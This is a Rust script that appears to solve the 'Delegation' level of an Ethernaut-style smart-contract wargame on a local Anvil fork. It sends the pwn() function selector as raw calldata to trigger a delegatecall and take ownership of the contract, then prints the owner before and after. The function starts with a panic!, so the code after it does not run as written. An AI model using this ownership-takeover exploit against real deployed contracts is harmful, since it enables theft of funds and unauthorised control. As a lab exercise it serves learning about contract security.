use alloy::json_abi::JsonAbi;
use alloy::providers::{Provider, ProviderBuilder};
use alloy::rpc::types::TransactionInput;
use alloy::{rpc::types::TransactionRequest, sol};
use alloy_eips::{BlockId, BlockNumberOrTag};
use alloy_primitives::{keccak256, Bytes};
use alloy_sol_types::SolCall;
use eyre::Result;
use tokio::time::{interval, Duration};

use ethers::{
    contract::EthCall,
    core::abi::AbiEncode,
    types::{Bytes as eBytes, H160 as eH160, U256 as eU256},
};

sol!(
    #[allow(missing_docs)]
    #[sol(rpc)]
    Delegate,
    "../client/src/contracts/out/Delegation.sol/Delegate.json"
);

sol! {
    #[allow(missing_docs)]
    function pwn() external;
}

sol!(
    #[allow(missing_docs)]
    #[sol(rpc)]
    Delegation,
    "../client/src/contracts/out/Delegation.sol/Delegation.json"
);

pub async fn solution_delegation() -> Result<()> {
    panic!("fail");
    let rpc_url = "http://localhost:8545";
    let provider =
        ProviderBuilder::new().on_anvil_with_wallet_and_config(|anvil| anvil.fork(rpc_url))?;
    let accounts = provider.get_accounts().await?;
    let deployer = accounts[0];
    let sender = accounts[1];
    println!("deployer: {deployer}");
    println!("sender: {sender}");

    let delegate_contract = Delegate::deploy(&provider, deployer).await?;
    let contract = Delegation::deploy(&provider, delegate_contract.address().clone()).await?;

    // let pwn_abi = Delegate::pwnCall.abi_encode();
    // let selector = &pwn_abi[..4];
    // let hex_selector = hex::encode(selector);
    // println!("Selector for pwn(): 0x{hex_selector}");

    let selector_hex = "dd365b8b"; // without 0x prefix
    let calldata_vec = hex::decode(selector_hex)?;
    let calldata = Bytes::from(calldata_vec);

    let owner = contract.owner().call().await?;
    println!("init owner: {owner}");
    println!("contract.address().clone(): {}", contract.address().clone());
    let tx = TransactionRequest::default()
        .from(sender)
        .to(contract.address().clone())
        .input(calldata.into());
    let pending_tx = provider.send_transaction(tx).await?;

    println!("Transaction hash: {}", pending_tx.tx_hash());

    let receipt = pending_tx.get_receipt().await.unwrap();
    println!("receipt.status(): {}", receipt.status());

    let owner = contract.owner().call().await?;
    println!("end owner: {owner}");
    Ok(())
}
